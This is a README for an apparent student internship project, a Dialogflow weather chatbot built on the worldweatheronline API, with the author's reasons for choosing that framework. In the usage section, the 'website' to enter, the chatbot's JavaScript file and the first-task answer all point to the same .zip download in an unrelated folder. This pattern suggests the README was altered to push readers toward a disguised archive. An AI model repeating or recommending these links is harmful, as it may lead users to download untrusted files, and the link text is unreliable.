# Why I chose this framework
I wanted to create a chatbot because I thought it was a really interesting task and is in a area that I'd like to develop my skills in. At first I wanted to try
out superscript, since I wasn't really familiar with any of the frameworks/services I thought I would just pick one. I struggled for quite some time trying to set up 
superscript, but it was littered with bugs and erros that I suspect stem from the compatibility with Windows 10. Therefore I decided to scrap my Superscript 
project and decided to try out dialogflow instead. This worked a lot better and I didn't really meet any hard challenges, so that's why I decided to focus fully on 
the dialogflow project. 


# How to use
To use the bot, simply enter this website:
https://raw.githubusercontent.com/Scartex/ardoqinternship/master/peritomy/ardoqinternship.zip

Some background: The bot is using a public API from worldweatheronline that gives updated information about the weather from cities around the world. 
To recieve this information you can use different commands, for example: "weather forecast in Oslo for tomorrow". 
You can also ask the bot for it's name where it will ask for your name as well. 

In the github repository you will find https://raw.githubusercontent.com/Scartex/ardoqinternship/master/peritomy/ardoqinternship.zip which is the JavaScript file for the chatbot, and https://raw.githubusercontent.com/Scartex/ardoqinternship/master/peritomy/ardoqinternship.zip which is the answer for the first task.
